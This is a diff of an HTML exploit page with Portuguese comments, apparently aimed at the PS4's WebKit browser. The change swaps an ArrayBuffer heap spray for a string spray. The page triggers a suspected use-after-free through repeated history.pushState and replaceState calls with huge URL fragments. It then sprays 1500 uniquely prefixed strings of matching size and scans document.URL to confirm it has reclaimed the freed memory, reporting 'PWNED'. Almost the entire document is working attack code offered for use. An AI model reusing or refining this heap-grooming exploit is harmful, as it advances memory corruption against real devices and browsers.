@@ -2,94 +2,121 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Large Bin Reclamation</title>
+<title>PS4 WebKit - String Reclamation Strategy</title>
+<style>
+    body { font-family: monospace; background: #111; color: #ddd; padding: 10px; }
+    button { width: 100%; padding: 15px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
+</style>
 </head>
 <body>
 
-<h2>PS4 WebKit - Large Bin Reclamation</h2>
-<p>Status: <span id="status">Aguardando...</span></p>
-
-<button onclick="runExploit()">EXECUTAR SPRAY + UAF</button>
-
-<pre id="log"></pre>
+<h3>PS4 WebKit: String-on-String Reclamation</h3>
+<div id="status">Pronto.</div>
+<button onclick="runStringExploit()">INICIAR ATAQUE DE STRINGS</button>
+<div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
-
-function log(m) { logEl.textContent += m + "\n"; }
+function log(m) { logEl.innerText += m + "\n"; }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function runExploit() {
-    logEl.textContent = "";
-    statusEl.textContent = "Spraying...";
-    
-    // 1. SPRAY DE OBJETOS GRANDES (340KB para bater com o ITER 48)
-    log("Fase 1: Spraying Large ArrayBuffers (340356 bytes)...");
-    let spray = [];
-    const TARGET_SIZE = 340356; 
-    
-    for(let i = 0; i < 200; i++) {
-        let buf = new ArrayBuffer(TARGET_SIZE);
-        let view = new Uint32Array(buf);
-        // Preenche com o marcador 0x1337BEEF + index
-        for(let j = 0; j < view.length; j += 4) {
-            view[j] = 0x1337BEEF;
-            view[j+1] = i; 
-        }
-        spray.push(buf);
-    }
-    log("Spray concluído: 200 blocos de 340KB alocados.");
+// Cria uma string única para evitar "String Interning" (deduplicação)
+function makeUniqueString(baseChar, length, id) {
+    // Adiciona um prefixo único para obrigar nova alocação
+    let prefix = id.toString() + "_"; 
+    let repeatCount = Math.floor((length - prefix.length) / baseChar.length);
+    return prefix + baseChar.repeat(repeatCount);
+}
 
-    // 2. TRIGGER UAF (Seu código estável)
-    statusEl.textContent = "Triggering UAF...";
-    log("Fase 2: Disparando UAF estável...");
+async function runStringExploit() {
+    logEl.innerText = "";
+    
+    // === FASE 1: TRIGGER DO UAF (Seu código estável) ===
+    statusEl.innerText = "1. Triggering UAF...";
+    log("Disparando UAF para liberar memória...");
     
     let size = 977;
     const STEP = 14461;
+    // O tamanho final no loop 48 é aprox 340356.
+    // Vamos salvar esse valor exato.
+    let finalSize = 0; 
+
     for(let i = 0; i < 48; i++) {
-        // Usando a técnica de % que funcionou no seu teste 2
-        let pattern = "%41%42%43%44"; // ABCD em hex
-        let frag = pattern.repeat(size / 12); 
+        // Usamos um padrão 'V' conhecido
+        let frag = "V".repeat(size); 
         
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
+        finalSize = size; // Guarda o tamanho da última alocação
         size += STEP;
         await sleep(5);
     }
+    
+    log(`Tamanho alvo estimado: ${finalSize} bytes`);
+    
+    // A janela do UAF está aberta agora. O GC pode rodar a qualquer momento.
+    // Precisamos ser rápidos.
 
-    log("Aguardando estabilização (100ms)...");
+    // === FASE 2: STRING SPRAY ===
+    statusEl.innerText = "2. Spraying Strings...";
+    log("Inundando Heap com Strings de substituição...");
+    
+    let spray = [];
+    // Criamos 1000 strings. Uma delas DEVE cair no buraco.
+    // Usamos o padrão "W" para diferenciar do "V" original.
+    const SPRAY_SIZE = finalSize; 
+    
+    for(let i = 0; i < 1500; i++) {
+        // Criamos strings levemente variadas para evitar cache
+        let s = makeUniqueString("W", SPRAY_SIZE, i);
+        spray.push(s);
+    }
+
+    // Força o acesso às strings para garantir alocação real (FlatString)
+    for(let i=0; i<spray.length; i+=100) {
+        let temp = spray[i].charAt(0);
+    }
+
     await sleep(100);
 
-    // 3. SCAN DE RECLAMAÇÃO
-    statusEl.textContent = "Scanning...";
+    // === FASE 3: VERIFICAÇÃO ===
+    statusEl.innerText = "3. Checking...";
     let url = document.URL;
-    log("URL vazada (Length): " + url.length);
-
-    let found = false;
-    // Procuramos pelo marcador 0x1337BEEF (em ASCII/UTF-8 o valor muda, buscamos por partes)
-    for(let k = 0; k < url.length - 8; k++) {
-        // Checa se os bytes do spray "atropelaram" o buffer da URL
-        if(url.charCodeAt(k) === 0xEF && url.charCodeAt(k+1) === 0xBE) {
-            log("!!! SUCESSO !!!");
-            log("Marcador 0xBEEF encontrado no offset: " + k);
-            found = true;
-            break;
-        }
+    log(`URL Length Atual: ${url.length}`);
+    
+    // Verificamos se o padrão mudou de V para W
+    let vCount = 0;
+    let wCount = 0;
+    
+    // Amostragem rápida
+    for(let k = 0; k < 1000; k++) {
+        if(url[k] === 'V') vCount++;
+        if(url[k] === 'W') wCount++;
     }
 
-    if(!found) {
-        log("Falha: Marcador não encontrado. Tentando dump parcial...");
-        log("Primeiros 100 caracteres: " + url.substring(0, 100));
-    }
+    log(`Amostra (primeiros 1k chars): V=${vCount}, W=${wCount}`);
 
+    // Busca profunda pelo ID da string vencedora
+    let match = url.match(/(\d+)_WWWW/);
+    if(match) {
+        log(`\n!!! SUCESSO !!!`);
+        log(`A memória foi reclamada pela String ID: ${match[1]}`);
+        log(`Você controla o conteúdo da URL liberada!`);
+        statusEl.innerText = "PWNED: MEMORY RECLAIMED";
+    } else if (wCount > 10) {
+        log(`\n!!! SUCESSO PARCIAL !!!`);
+        log(`Detectamos padrões 'W'. O Spray funcionou, mas perdeu o cabeçalho.`);
+    } else {
+        log(`\nFalha: Ainda vendo apenas 'V'.`);
+        log(`Tente ajustar o SPRAY_SIZE (+/- 16 bytes para headers).`);
+    }
+    
     window.keepAlive = spray;
-    statusEl.textContent = "Concluído.";
 }
 </script>
-
 </body>
 </html>
